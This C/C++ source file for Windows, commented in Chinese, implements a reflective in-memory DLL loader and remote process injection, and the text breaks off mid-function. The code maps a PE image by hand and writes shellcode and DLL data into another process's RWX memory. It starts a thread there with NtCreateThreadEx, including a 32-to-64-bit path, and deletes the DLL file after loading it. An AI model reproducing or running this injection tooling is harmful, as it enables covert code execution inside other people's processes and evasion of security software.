//		pDosHeader = (PIMAGE_DOS_HEADER)lpFileData; // DOS头
//		//检查dos头的标记
//		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) goto CODEEXIT; //0×5A4D : MZ
//
//		//检查长度
//		if ((DWORDX)DataLength < (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS))) goto CODEEXIT;
//		//取得pe头
//		pNTHeader = (PIMAGE_NT_HEADERS)((DWORDX)lpFileData + pDosHeader->e_lfanew); // PE头
//		//检查pe头的合法性
//		if (pNTHeader->Signature != IMAGE_NT_SIGNATURE) goto CODEEXIT; //0×00004550: PE00
//		if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0×2000: File is a DLL
//			goto CODEEXIT;
//		if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0×0002: 指出文件可以运行
//			goto CODEEXIT;
//		if (pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
//			goto CODEEXIT;
//
//
//		//取得节表（段表）
//		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORDX)pNTHeader + sizeof(IMAGE_NT_HEADERS));
//		//验证每个节表的空间
//		for (i = 0; i< pNTHeader->FileHeader.NumberOfSections; i++)
//		{
//			if ((pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData) >(DWORD)DataLength) goto CODEEXIT;
//		}
//
//		/**********************************************************************/
//		nAlign = pNTHeader->OptionalHeader.SectionAlignment; //段对齐字节数
//
//		//ImageSize = pNTHeader->OptionalHeader.SizeOfImage;
//		//// 计算所有头的尺寸。包括dos, coff, pe头 和 段表的大小
//		ImageSize = (pNTHeader->OptionalHeader.SizeOfHeaders + nAlign - 1) / nAlign * nAlign;
//		// 计算所有节的大小
//		for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
//		{
//			//得到该节的大小
//			int CodeSize = pSectionHeader[i].Misc.VirtualSize;
//			int LoadSize = pSectionHeader[i].SizeOfRawData;
//			int MaxSize = (LoadSize > CodeSize) ? (LoadSize) : (CodeSize);
//
//			int SectionSize = (pSectionHeader[i].VirtualAddress + MaxSize + nAlign - 1) / nAlign * nAlign;
//			if (ImageSize < SectionSize)
//				ImageSize = SectionSize; //Use the Max;
//		}
//		if (ImageSize == 0) goto CODEEXIT;
//
//		// 分配虚拟内存
//		SIZE_T uSize = ImageSize;
//		pNtAllocateVirtualMemory((HANDLE)-1, &pMemoryAddress, 0, &uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//
//		if (pMemoryAddress != NULL)
//		{
//
//			// 计算需要复制的PE头+段表字节数
//			int HeaderSize = pNTHeader->OptionalHeader.SizeOfHeaders;
//			int SectionSize = pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
//			int MoveSize = HeaderSize + SectionSize;
//			//复制头和段信息
//			for (i = 0; i < MoveSize; i++)
//			{
//				*((PCHAR)pMemoryAddress + i) = *((PCHAR)lpFileData + i);
//			}
//			//memmove(pMemoryAddress, lpFileData, MoveSize);//为了少用一个API,直接用上面的单字节复制数据就行了
//
//			//复制每个节
//			for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
//			{
//				if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)continue;
//				// 定位该节在内存中的位置
//				void *pSectionAddress = (void *)((DWORDX)pMemoryAddress + pSectionHeader[i].VirtualAddress);
//				// 复制段数据到虚拟内存
//				//	memmove((void *)pSectionAddress,(void *)((DWORDX)lpFileData + pSectionHeader[i].PointerToRawData),	pSectionHeader[i].SizeOfRawData);
//				//为了少用一个API,直接用上面的单字节复制数据就行了
//				for (size_t k = 0; k < pSectionHeader[i].SizeOfRawData; k++)
//				{
//					*((PCHAR)pSectionAddress + k) = *((PCHAR)lpFileData + pSectionHeader[i].PointerToRawData + k);
//				}
//			}
//			/*******************重定位信息****************************************************/
//
//			if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress >0
//				&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size>0)
//			{
//
//				DWORDX Delta = (DWORDX)pMemoryAddress - pNTHeader->OptionalHeader.ImageBase;
//				DWORDX * pAddress;
//				//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
//				PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pMemoryAddress
//					+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
//				while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
//				{
//					WORD *pLocData = (WORD *)(DWORDX)pLoc + sizeof(IMAGE_BASE_RELOCATION);
//					//计算本节需要修正的重定位项（地址）的数目
//					int NumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
//					for (i = 0; i < NumberOfReloc; i++)
//					{
//						if ((DWORDX)(pLocData[i] & 0xF000) == 0x00003000 || (DWORDX)(pLocData[i] & 0xF000) == 0x0000A000) //这是一个需要修正的地址
//						{
//							// 举例：
//							// pLoc->VirtualAddress = 0×1000;
//							// pLocData[i] = 0×313E; 表示本节偏移地址0×13E处需要修正
//							// 因此 pAddress = 基地址 + 0×113E
//							// 里面的内容是 A1 ( 0c d4 02 10) 汇编代码是： mov eax , [1002d40c]
//							// 需要修正1002d40c这个地址
//							pAddress = (DWORDX *)((DWORDX)pMemoryAddress + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
//							*pAddress += Delta;
//						}
//					}
//					//转移到下一个节进行处理
//					pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pLoc + pLoc->SizeOfBlock);
//				}
//				/***********************************************************************/
//			}
//
//			/******************* 修正引入地址表**************/
//			DWORDX Offset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
//			if (Offset == 0)
//				goto CODEEXIT; //No Import Table
//
//			PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pMemoryAddress + Offset);
//
//			PIMAGE_IMPORT_BY_NAME pByName = NULL;
//			while (pID->Name != 0)
//			{
//				PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->FirstThunk);
//				PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->FirstThunk);
//				//获取dll的名字
//				char* pName = (char*)((DWORDX)pMemoryAddress + pID->Name);
//				HANDLE hDll = 0;
//
//				RtlInitAnsiString(&ansiStr, pName);
//
//				RtlAnsiStringToUnicodeString(&UnicodeString, &ansiStr, true);
//				pLdrLoadDll(NULL, NULL, &UnicodeString, &hDll);
//				RtlFreeUnicodeString(&UnicodeString);
//
//				if (hDll == NULL) {
//
//					goto CODEEXIT; //NOT FOUND DLL
//				}
//
//				//获取DLL中每个导出函数的地址，填入IAT
//				//每个IAT结构是 ：
//				// union { PBYTE ForwarderString;
//				// PDWORDX Function;
//				// DWORDX Ordinal;
//				// PIMAGE_IMPORT_BY_NAME AddressOfData;
//				// } u1;
//				// 长度是一个DWORDX ，正好容纳一个地址。
//				for (i = 0;; i++)
//				{
//					if (pOriginalIAT[i].u1.Function == 0)break;
//					FARPROC lpFunction = NULL;
//					if (IMAGE_SNAP_BY_ORDINAL(pOriginalIAT[i].u1.Ordinal)) //这里的值给出的是导出序号
//					{
//						if (IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal))
//						{
//
//							LdrGetProcedureAddress(hDll, NULL, IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal), &lpFunction);
//						}
//					}
//					else//按照名字导入
//					{
//						//获取此IAT项所描述的函数名称
//						pByName = (PIMAGE_IMPORT_BY_NAME)((DWORDX)pMemoryAddress + (DWORDX)(pOriginalIAT[i].u1.AddressOfData));
//						if ((char *)pByName->Name)
//						{
//							RtlInitAnsiString(&ansiStr, (char *)pByName->Name);
//							LdrGetProcedureAddress(hDll, &ansiStr, 0, &lpFunction);
//
//						}
//
//					}
//
//					//标记***********
//
//					if (lpFunction != NULL) //找到了！
//						pRealIAT[i].u1.Function = (DWORDX)lpFunction;
//					else
//						goto CODEEXIT;
//				}
//
//				//move to next
//				pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
//			}
//
//			/***********************************************************/
//			//修正基地址
//			pNTHeader->OptionalHeader.ImageBase = (DWORDX)pMemoryAddress;
//			//NtProtectVirtualMemory((HANDLE)-1, &pMemoryAddress, (PSIZE_T)&ImageSize, PAGE_EXECUTE_READ, &oldProtect);
//			pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (DWORDX)pMemoryAddress);
//			pDllMain(pMemoryAddress, DLL_PROCESS_ATTACH, NULL);//这里的参数1本来应该传的是(HMODULE)pMemoryAddress,但是没必要,因为无法使用资源,所以没必要,要使用资源,论坛有其他人说过如何使用
//		}
//	}
//
//CODEEXIT:
//	return (DWORDX)pMemoryAddress;
//}

DWORDX WINAPI MemLoadLibrary2(PARAMX *X)//2502
{
	LPCVOID lpFileData = X->lpFileData;
	DWORDX DataLength = X->DataLength;

	/****************初始化调用函数********************/
	LdrGetProcedureAddressT LdrGetProcedureAddress = (X->LdrGetProcedureAddress);

	NtAllocateVirtualMemoryT pNtAllocateVirtualMemory = (X->dwNtAllocateVirtualMemory);
	LdrLoadDllT pLdrLoadDll = (X->pLdrLoadDll);
	RtlInitAnsiStringT RtlInitAnsiString = X->RtlInitAnsiString;
	RtlAnsiStringToUnicodeStringT RtlAnsiStringToUnicodeString = X->RtlAnsiStringToUnicodeString;
	RtlFreeUnicodeStringT RtlFreeUnicodeString = X->RtlFreeUnicodeString;

	ProcDllMain pDllMain = NULL;
	void *pMemoryAddress = NULL;

	ANSI_STRING ansiStr;
	UNICODE_STRING UnicodeString;
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	int ImageSize = 0;
	int nAlign = 0;
	int i = 0;

	//检查数据有效性，并初始化
	/*********************CheckDataValide**************************************/
	//	PIMAGE_DOS_HEADER pDosHeader;
	//检查长度
	if (DataLength > sizeof(IMAGE_DOS_HEADER))
	{
		pDosHeader = (PIMAGE_DOS_HEADER)lpFileData; // DOS头
		//检查dos头的标记
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) goto CODEEXIT; //0×5A4D : MZ

		//检查长度
		if ((DWORDX)DataLength < (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS))) goto CODEEXIT;
		//取得pe头
		pNTHeader = (PIMAGE_NT_HEADERS)((DWORDX)lpFileData + pDosHeader->e_lfanew); // PE头
		//检查pe头的合法性
		if (pNTHeader->Signature != IMAGE_NT_SIGNATURE) goto CODEEXIT; //0×00004550: PE00
		if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0×2000: File is a DLL
			goto CODEEXIT;
		if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0×0002: 指出文件可以运行
			goto CODEEXIT;
		if (pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
			goto CODEEXIT;


		//取得节表（段表）
		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORDX)pNTHeader + sizeof(IMAGE_NT_HEADERS));
		//验证每个节表的空间
		for (i = 0; i< pNTHeader->FileHeader.NumberOfSections; i++)
		{
			if ((pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
				> (DWORD)DataLength)
			{
				goto CODEEXIT;
			}
		}

		/**********************************************************************/
		nAlign = pNTHeader->OptionalHeader.SectionAlignment; //段对齐字节数

		//ImageSize = pNTHeader->OptionalHeader.SizeOfImage;
		//// 计算所有头的尺寸。包括dos, coff, pe头 和 段表的大小
		ImageSize = (pNTHeader->OptionalHeader.SizeOfHeaders + nAlign - 1) / nAlign * nAlign;
		// 计算所有节的大小
		for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
		{
			//得到该节的大小
			int CodeSize = pSectionHeader[i].Misc.VirtualSize;
			int LoadSize = pSectionHeader[i].SizeOfRawData;
			int MaxSize = (LoadSize > CodeSize) ? (LoadSize) : (CodeSize);

			int SectionSize = (pSectionHeader[i].VirtualAddress 
				+ MaxSize + nAlign - 1) / nAlign * nAlign;
			if (ImageSize < SectionSize)
				ImageSize = SectionSize; //Use the Max;
		}
		if (ImageSize == 0) goto CODEEXIT;

		// 分配虚拟内存
		SIZE_T uSize = ImageSize;
		pNtAllocateVirtualMemory((HANDLE)-1, &pMemoryAddress, 0, &uSize,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pMemoryAddress != NULL)
		{

			// 计算需要复制的PE头+段表字节数
			int HeaderSize = pNTHeader->OptionalHeader.SizeOfHeaders;
			int SectionSize = pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
			int MoveSize = HeaderSize + SectionSize;
			//复制头和段信息
			for (i = 0; i < MoveSize; i++)
			{
				*((PCHAR)pMemoryAddress + i) = *((PCHAR)lpFileData + i);
			}
			//为了少用一个API,直接用上面的单字节复制数据就行了
			//memmove(pMemoryAddress, lpFileData, MoveSize);

			//复制每个节
			for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
			{
				if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)continue;
				// 定位该节在内存中的位置
				void *pSectionAddress = (void *)((DWORDX)pMemoryAddress + pSectionHeader[i].VirtualAddress);
				// 复制段数据到虚拟内存
				//	memmove((void *)pSectionAddress,(void *)((DWORDX)lpFileData 
				//		+ pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData);
				//为了少用一个API,直接用上面的单字节复制数据就行了
				for (size_t k = 0; k < pSectionHeader[i].SizeOfRawData; k++)
				{
					*((PCHAR)pSectionAddress + k) = *((PCHAR)lpFileData + pSectionHeader[i].PointerToRawData + k);
				}
			}
			/*******************重定位信息****************************************************/
			if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress >0
				&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size>0)
			{

				DWORDX Delta = (DWORDX)pMemoryAddress - pNTHeader->OptionalHeader.ImageBase;
				DWORDX * pAddress;
				//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
				PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pMemoryAddress
					+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
				while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
				{
					WORD *pLocData = (WORD *)((DWORDX)pLoc + sizeof(IMAGE_BASE_RELOCATION));
					//计算本节需要修正的重定位项（地址）的数目
					int NumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
					for (i = 0; i < NumberOfReloc; i++)
					{
						if ((DWORDX)(pLocData[i] & 0xF000) == 0x00003000 || (DWORDX)(pLocData[i] & 0xF000) == 0x0000A000) //这是一个需要修正的地址
						{
							// 举例：
							// pLoc->VirtualAddress = 0×1000;
							// pLocData[i] = 0×313E; 表示本节偏移地址0×13E处需要修正
							// 因此 pAddress = 基地址 + 0×113E
							// 里面的内容是 A1 ( 0c d4 02 10) 汇编代码是： mov eax , [1002d40c]
							// 需要修正1002d40c这个地址
							pAddress = (DWORDX *)((DWORDX)pMemoryAddress + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
							*pAddress += Delta;
						}
					}
					//转移到下一个节进行处理
					pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pLoc + pLoc->SizeOfBlock);
				}
				/***********************************************************************/
			}

			/******************* 修正引入地址表**************/
			DWORDX Offset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
			if (Offset == 0)
				goto CODEEXIT; //No Import Table

			PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pMemoryAddress + Offset);

			PIMAGE_IMPORT_BY_NAME pByName = NULL;
			while (pID->Name != 0)
			{
				PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->FirstThunk);
				PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->FirstThunk);
				//PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->OriginalFirstThunk);
				//获取dll的名字
				char* pName = (char*)((DWORDX)pMemoryAddress + pID->Name);
				HANDLE hDll = 0;

				RtlInitAnsiString(&ansiStr, pName);

				RtlAnsiStringToUnicodeString(&UnicodeString, &ansiStr, true);
				pLdrLoadDll(NULL, NULL, &UnicodeString, &hDll);
				RtlFreeUnicodeString(&UnicodeString);

				if (hDll == NULL) {

					goto CODEEXIT; //NOT FOUND DLL
				}

				//获取DLL中每个导出函数的地址，填入IAT
				//每个IAT结构是 ：
				// union { PBYTE ForwarderString;
				// PDWORDX Function;
				// DWORDX Ordinal;
				// PIMAGE_IMPORT_BY_NAME AddressOfData;
				// } u1;
				// 长度是一个DWORDX ，正好容纳一个地址。
				for (i = 0;; i++)
				{
					if (pOriginalIAT[i].u1.Function == 0)break;
					FARPROC lpFunction = NULL;
					if (IMAGE_SNAP_BY_ORDINAL(pOriginalIAT[i].u1.Ordinal)) //这里的值给出的是导出序号
					{
						if (IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal))
						{

							LdrGetProcedureAddress(hDll, NULL, IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal), &lpFunction);
						}
					}
					else//按照名字导入
					{
						//获取此IAT项所描述的函数名称
						pByName = (PIMAGE_IMPORT_BY_NAME)((DWORDX)pMemoryAddress 
							+ (DWORDX)(pOriginalIAT[i].u1.AddressOfData));
						if ((char *)pByName->Name)
						{
							RtlInitAnsiString(&ansiStr, (char *)pByName->Name);
							LdrGetProcedureAddress(hDll, &ansiStr, 0, &lpFunction);

						}

					}

					//标记***********

					if (lpFunction != NULL) //找到了！
						pRealIAT[i].u1.Function = (DWORDX)lpFunction;
					else
						goto CODEEXIT;
				}

				//move to next
				pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
			}

			/***********************************************************/
			//修正基地址
			pNTHeader->OptionalHeader.ImageBase = (DWORDX)pMemoryAddress;
			//NtProtectVirtualMemory((HANDLE)-1, &pMemoryAddress, (PSIZE_T)&ImageSize, PAGE_EXECUTE_READ, &oldProtect);
			pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (DWORDX)pMemoryAddress);
			//这里的参数1本来应该传的是(HMODULE)pMemoryAddress,但是没必要,
			//因为无法使用资源,所以没必要,要使用资源,论坛有其他人说过如何使用
			pDllMain(0, DLL_PROCESS_ATTACH, pMemoryAddress);
		}
	}
CODEEXIT:
	return (DWORDX)pMemoryAddress;
}

void SaveShellCode(int size)
{
	DWORD ssss = 0;
	HANDLE hFile = CreateFileA("c:\\1.CODE", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile)
	{
		WriteFile(hFile, MemLoadLibrary2, size, &ssss, NULL);
		CloseHandle(hFile);
	}
}

void LoadLocalDll(LPSTR dllName)
{
	HANDLE hFile = CreateFileA(dllName, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile)
	{
		DWORD fileSize = GetFileSize(hFile, NULL);
		DWORD RSize = 0;
		VOID *pBuffer = malloc(fileSize);
		ReadFile(hFile, pBuffer, fileSize, &RSize, NULL);
		HMODULE NTDLL = GetModuleHandleA("ntdll");
		PARAMX param;
		RtlZeroMemory(&param, sizeof(PARAMX));
		param.lpFileData = pBuffer;
		param.DataLength = fileSize;
		param.LdrGetProcedureAddress = (LdrGetProcedureAddressT)GetProcAddress(NTDLL,
			"LdrGetProcedureAddress");
		param.dwNtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcAddress(NTDLL,
			"NtAllocateVirtualMemory");
		param.pLdrLoadDll = (LdrLoadDllT)GetProcAddress(NTDLL, "LdrLoadDll");
		param.RtlInitAnsiString = (RtlInitAnsiStringT)GetProcAddress(NTDLL,
			"RtlInitAnsiString");
		param.RtlAnsiStringToUnicodeString = (RtlAnsiStringToUnicodeStringT)GetProcAddress(NTDLL,
			"RtlAnsiStringToUnicodeString");
		param.RtlFreeUnicodeString = (RtlFreeUnicodeStringT)GetProcAddress(NTDLL,
			"RtlFreeUnicodeString");
		PVOID pModule = (PVOID)MemLoadLibrary2(&param);
		CloseHandle(hFile);
		free(pBuffer);
		DeleteFileA(dllName);
	}
}

void LoadLocalData(LPVOID data, DWORD dataSize)
{
	HMODULE NTDLL = GetModuleHandleA("ntdll");
	PARAMX param;
	RtlZeroMemory(&param, sizeof(PARAMX));
	param.lpFileData = data;
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = (LdrGetProcedureAddressT)GetProcAddress(NTDLL, 
		"LdrGetProcedureAddress");
	param.dwNtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcAddress(NTDLL,
		"NtAllocateVirtualMemory");
	param.pLdrLoadDll = (LdrLoadDllT)GetProcAddress(NTDLL, "LdrLoadDll");
	param.RtlInitAnsiString = (RtlInitAnsiStringT)GetProcAddress(NTDLL, "RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = (RtlAnsiStringToUnicodeStringT)GetProcAddress(NTDLL,
		"RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = (RtlFreeUnicodeStringT)GetProcAddress(NTDLL,
		"RtlFreeUnicodeString");
	try
	{
		PVOID pModule = (PVOID)MemLoadLibrary2(&param);
	}
	catch (...)
	{		
	}	
}

#ifdef _WIN64
BOOL LoadRemoteDataX64ByX64(LPVOID data, DWORD dataSize, DWORD processId)
{
	SIZE_T dWrited = 0;
	HMODULE ntdll = NULL;
	if (!processId) return FALSE;
	ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) return FALSE;
	DWORD RSize = 0;
	DWORD fileSize2 = sizeof(shellcodex64);
	VOID *pBuffer2 = shellcodex64;
	PARAMX64 param;
	RtlZeroMemory(&param, sizeof(PARAMX));
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = (DWORD64)GetProcAddress(ntdll, 
		"LdrGetProcedureAddress");
	param.dwNtAllocateVirtualMemory = (DWORD64)GetProcAddress(ntdll,
		"NtAllocateVirtualMemory");
	param.pLdrLoadDll = (DWORD64)GetProcAddress(ntdll, "LdrLoadDll");
	param.RtlInitAnsiString = (DWORD64)GetProcAddress(ntdll,
		"RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = (DWORD64)GetProcAddress(ntdll, 
		"RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = (DWORD64)GetProcAddress(ntdll,
		"RtlFreeUnicodeString");

	//开始远程注入
	EnableDebugPrivilege();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processId);
	if (hProcess == NULL)
	{
		return FALSE;
	}
	//申请内存,把shellcode和DLL数据,和参数复制到目标进程
	DWORD64 pAddress = (DWORD64)VirtualAllocEx(hProcess, 0,
		dataSize + fileSize2 + sizeof(PARAMX) + 0x100, 
		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	int a = GetLastError();
	if (!pAddress)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	param.lpFileData = pAddress;//修成下DLL数据的地址

	WriteProcessMemory(hProcess, (LPVOID)pAddress, data, dataSize, &dWrited);//DLL数据写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize), pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize + fileSize2), &param, sizeof(PARAMX), &dWrited);//参数写入到目标
	_NtCreateThreadEx NtCreateThreadEx64 = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	if (NtCreateThreadEx64 == NULL)return FALSE;
	HANDLE hThread = NULL;
	NtCreateThreadEx64(&hThread, (DWORD64)THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)(pAddress + dataSize), (LPVOID)(pAddress + dataSize + fileSize2), 0, 0, 0, 0, 0);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return TRUE;
}
#else

void LoadRemotedll32byX64(LPSTR dllName, LPSTR Processname)
{
	SIZE_T dWrited = 0;
	DWORD processId = GetProcessId(Processname);
	if (!processId)return;
	HANDLE hFile = CreateFileA(dllName, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		//获取DLL数据
		DWORD fileSize = GetFileSize(hFile, NULL);
		DWORD RSize = 0;
		VOID *pBuffer = malloc(fileSize);
		ReadFile(hFile, pBuffer, fileSize, &RSize, NULL);
		CloseHandle(hFile);
		DeleteFileA(dllName);
		//获取shellcode
		DWORD fileSize2 = sizeof(shellcodex64);

		VOID *pBuffer2 = shellcodex64;
		PARAMX64 param;
		RtlZeroMemory(&param, sizeof(PARAMX64));
		param.DataLength = fileSize;
		param.LdrGetProcedureAddress = getLdrGetProcedureAddress();
		param.dwNtAllocateVirtualMemory = GetProcAddress64(getNTDLL64(), "NtAllocateVirtualMemory");
		param.pLdrLoadDll = GetProcAddress64(getNTDLL64(), "LdrLoadDll");
		param.RtlInitAnsiString = GetProcAddress64(getNTDLL64(), "RtlInitAnsiString");
		param.RtlAnsiStringToUnicodeString = GetProcAddress64(getNTDLL64(), "RtlAnsiStringToUnicodeString");
		param.RtlFreeUnicodeString = GetProcAddress64(getNTDLL64(), "RtlFreeUnicodeString");


		//开始远程注入
		EnableDebugPrivilege();

		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processId);
		int a = GetLastError();
		if (hProcess == NULL)
		{
			free(pBuffer);
			return;
		}
		//申请内存,把shellcode和DLL数据,和参数复制到目标进程
		DWORD64 pAddress = VirtualAllocEx64(hProcess, 0, fileSize + fileSize2 + sizeof(PARAMX64) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!pAddress)
		{
			free(pBuffer);
			CloseHandle(hProcess);
			return;
		}

		param.lpFileData = pAddress;//修成下DLL数据的地址

		WriteProcessMemory64(hProcess, pAddress, pBuffer, fileSize, &dWrited);//DLL数据写入到目标
		WriteProcessMemory64(hProcess, pAddress + fileSize, pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
		WriteProcessMemory64(hProcess, pAddress + fileSize + fileSize2, &param, sizeof(PARAMX64), &dWrited);//参数写入到目标

		free(pBuffer);
		DWORD64 NtCreateThreadEx64 = GetProcAddress64(getNTDLL64(), "NtCreateThreadEx");
		HANDLE hThread;
		X64Call(NtCreateThreadEx64, 11, (DWORD64)&hThread, (DWORD64)THREAD_ALL_ACCESS, (DWORD64)NULL, (DWORD64)hProcess, (DWORD64)(pAddress + fileSize), (DWORD64)(pAddress + fileSize + fileSize2), (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0);
		return;
	}
}
BOOL LoadRemoteData32By64(LPVOID data, DWORD dataSize, DWORD processId)
{
	SIZE_T dWrited = 0;
	if (processId == NULL)return FALSE;
	if (!processId)return FALSE;
	DWORD RSize = 0;
	DWORD fileSize2 = sizeof(shellcodex64);
	VOID *pBuffer2 = shellcodex64;
	PARAMX64 param;
	RtlZeroMemory(&param, sizeof(PARAMX64));
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = getLdrGetProcedureAddress();
	param.dwNtAllocateVirtualMemory = GetProcAddress64(getNTDLL64(), "NtAllocateVirtualMemory");
	param.pLdrLoadDll = GetProcAddress64(getNTDLL64(), "LdrLoadDll");
	param.RtlInitAnsiString = GetProcAddress64(getNTDLL64(), "RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = GetProcAddress64(getNTDLL64(), "RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = GetProcAddress64(getNTDLL64(), "RtlFreeUnicodeString");


	//开始远程注入
	EnableDebugPrivilege();

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processId);
	if (hProcess == NULL)
	{
		return FALSE;
	}
	//申请内存,把shellcode和DLL数据,和参数复制到目标进程
	DWORD64 pAddress = VirtualAllocEx64(hProcess, 0, dataSize + fileSize2 + sizeof(PARAMX64) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddress)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	param.lpFileData = pAddress;//修成下DLL数据的地址

	WriteProcessMemory64(hProcess, pAddress, data, dataSize, &dWrited);//DLL数据写入到目标
	WriteProcessMemory64(hProcess, pAddress + dataSize, pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
